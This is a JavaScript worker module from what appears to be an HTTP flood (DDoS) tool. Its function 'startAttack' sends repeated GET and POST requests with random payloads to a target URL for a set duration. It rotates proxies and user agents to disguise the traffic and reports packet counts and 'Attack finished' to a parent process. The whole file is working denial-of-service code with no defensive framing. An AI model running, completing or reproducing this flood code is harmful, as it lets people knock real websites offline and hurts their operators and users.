import { parentPort, workerData } from "worker_threads";

import { createMimicHttpClient } from "../utils/clientUtils.js";
import { randomBoolean, randomString } from "../utils/randomUtils.js";

const startAttack = () => {
  const { target, proxies, userAgents, duration, packetDelay, packetSize } =
    workerData;

  const fixedTarget = target.startsWith("http") ? target : `https://${target}`;
  let totalPackets = 0;
  const startTime = Date.now();

  const sendRequest = async (proxy, userAgent) => {
    try {
      const client = createMimicHttpClient(proxy, userAgent);
      const isGet = packetSize > 64 ? false : randomBoolean();
      const payload = randomString(packetSize);

      if (isGet) {
        await client.get(`${fixedTarget}/${payload}`);
      } else {
        await client.post(fixedTarget, payload);
      }

      totalPackets++;
      parentPort.postMessage({
        log: `✅ Request successful from ${proxy.protocol}://${proxy.host}:${proxy.port} to ${fixedTarget}`,
        totalPackets,
      });
    } catch (error) {
      parentPort.postMessage({
        log: `❌ Request failed from ${proxy.protocol}://${proxy.host}:${proxy.port} to ${fixedTarget}: ${error.message}`,
        totalPackets,
      });
    }
  };

  const interval = setInterval(() => {
    const elapsedTime = (Date.now() - startTime) / 1000;

    if (elapsedTime >= duration) {
      clearInterval(interval);
      parentPort.postMessage({ log: "Attack finished", totalPackets });
      process.exit(0);
    }

    const proxy = proxies[Math.floor(Math.random() * proxies.length)];
    const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];

    sendRequest(proxy, userAgent);
  }, packetDelay);
};

if (workerData) {
  startAttack();
}
